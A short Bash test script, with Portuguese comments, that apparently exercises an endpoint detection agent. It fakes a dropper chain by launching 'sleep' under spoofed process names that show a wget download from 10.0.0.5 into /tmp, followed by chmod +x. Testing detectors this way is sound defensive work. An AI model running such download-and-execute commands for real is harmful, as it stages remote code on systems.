#!/usr/bin/env bash
# endpoint app-03: cadeia de dropper (download -> materializa em /tmp -> chmod +x)
# rodar dentro do agente: docker compose exec -T agent_app bash -s < tests/scenarios/app.sh
set -u
spoof() { bash -c "exec -a \"$1\" sleep 60" >/dev/null 2>&1 & }
step()  { sleep 3; }

echo "[app-03] (1) download do artefato"
spoof "wget http://10.0.0.5/m -O /tmp/m"
step
echo "[app-03] (2) materializa o artefato em /tmp"
printf '#!/bin/sh\n' > /tmp/m
step
echo "[app-03] (3) chmod +x (completa a cadeia de dropper)"
spoof "chmod +x /tmp/m"
step

echo "[app-03] concluido"
